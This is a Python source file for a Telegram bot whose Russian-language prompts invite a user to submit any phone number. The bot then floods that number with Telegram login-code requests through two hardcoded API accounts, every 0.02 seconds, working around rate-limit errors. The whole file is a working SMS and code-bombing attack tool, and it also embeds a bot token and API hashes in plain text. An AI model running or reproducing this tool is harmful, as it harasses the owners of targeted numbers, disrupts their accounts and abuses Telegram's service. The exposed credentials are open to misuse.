import asyncio
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError

BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"

accounts = [
    {'api_id': 35911533, 'api_hash': '11dafcdc1514796c867055023716d39a'},
    {'api_id': 16623, 'api_hash': '8c9dbfe58437d1739540f5d53c72ae4b'}
]

spam_tasks = {}
current_number = None
account_index = 0

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Просто отправь номер телефона в формате +380XXXXXXXXX или +7XXXXXXXXXX\n"
        "Бот начнёт спамить кодами, используя два аккаунта.\n"
        "Остановить — /stop"
    )

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def handle_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_number
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идёт спам. Останови /stop и отправь новый номер.")
        return
    phone = update.message.text.strip()
    if not phone.startswith('+'):
        await update.message.reply_text("Номер должен начинаться с +, например +380963836766")
        return
    current_number = phone
    await update.message.reply_text(f"Запускаю спам на номер {phone} через {len(accounts)} аккаунтов...")

    async def spam():
        global account_index
        count = 0
        clients = {}
        while True:
            acc = accounts[account_index % len(accounts)]
            account_index += 1
            key = (acc['api_id'], acc['api_hash'])
            if key not in clients:
                client = TelegramClient(None, acc['api_id'], acc['api_hash'])
                await client.connect()
                clients[key] = client
            else:
                client = clients[key]
            try:
                await client.send_code_request(phone)
                count += 1
                await context.bot.send_message(chat_id, f"Код #{count} через акк {acc['api_id']}")
                await asyncio.sleep(0.02)
            except FloodWaitError as e:
                sec = e.seconds
                await context.bot.send_message(chat_id, f"FloodWait {sec} сек, удаляю клиент акка {acc['api_id']}")
                await client.disconnect()
                clients.pop(key, None)
                await asyncio.sleep(sec)
            except Exception as e:
                err = str(e)
                if "all available options" in err or "ResendCodeRequest" in err:
                    await context.bot.send_message(chat_id, f"Все методы на акк {acc['api_id']}, удаляю клиент")
                    await client.disconnect()
                    clients.pop(key, None)
                else:
                    await context.bot.send_message(chat_id, f"Ошибка на акк {acc['api_id']}: {err[:60]}, пересоздам")
                    await client.disconnect()
                    clients.pop(key, None)
                await asyncio.sleep(0.05)

    task = asyncio.create_task(spam())
    spam_tasks[chat_id] = task

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_number))
    app.run_polling()

if __name__ == "__main__":
    main()
